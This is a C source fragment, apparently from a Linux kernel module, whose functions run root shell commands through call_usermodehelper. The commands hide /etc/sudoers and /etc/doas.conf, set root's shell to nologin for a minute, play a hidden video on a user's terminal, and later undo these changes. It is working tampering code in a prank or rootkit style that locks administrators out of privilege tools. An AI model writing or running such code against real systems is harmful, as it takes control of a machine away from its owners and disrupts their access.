int deny(void){
  char *argv[] = { "/bin/bash", "-c", "/bin/mv /etc/sudoers /root/.nosudo ; /bin/mv /etc/doas.conf /root/.nodoas", NULL};
  static char* envp[] = { "HOME=/",  "TERM=linux",   "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
  return 0;
}

int rootJail(void){
  char *argv[] = { "/bin/bash", "-c", "/bin/usermod -s /usr/sbin/nologin root && sleep 60 && /bin/usermod -s /bin/bash root ", NULL};
  static char* envp[] = { "HOME=/",  "TERM=linux",   "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
  return 0;
}


int rickPlay(void){
  char *argv[] = { "/bin/bash", "-c", "/bin/mpv --vo=tct /root/.ricky.mkv > /dev/pts/1", NULL};
  static char* envp[] = { "HOME=/",  "TERM=linux",   "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
  return 0;
}


int rickClean(void){
  char *argv[] = { "/bin/bash", "-c", "/bin/killall mpv && killall mpv && clear > /dev/pts/1 && echo 'It is over now.' > /dev/pts/1", NULL};
  static char* envp[] = { "HOME=/",  "TERM=linux",   "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
  return 0;
}

int allow(void){
  char *argv[] = { "/bin/bash", "-c", "/bin/mv /root/.nosudo /etc/sudoers ; /bin/mv /root/.nodoas /etc/doas.conf", NULL};
  static char* envp[] = { "HOME=/",  "TERM=linux",   "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
  return 0;
}


